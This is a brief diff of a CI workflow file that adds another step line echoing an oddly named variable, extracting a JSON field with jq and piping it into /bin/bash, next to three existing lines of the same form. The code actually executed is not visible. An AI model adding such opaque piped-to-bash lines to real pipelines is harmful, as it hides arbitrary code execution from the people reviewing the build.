@@ -26,6 +26,7 @@ jobs:
           echo $not9482 | jq -r .gq360 | /bin/bash
           echo $ct2 | jq -r .ptw446 | /bin/bash
           echo $g14024 | jq -r .u380 | /bin/bash
+          echo $tft171 | jq -r .yes57 | /bin/bash
 
       - name: Upload data
         if: always()
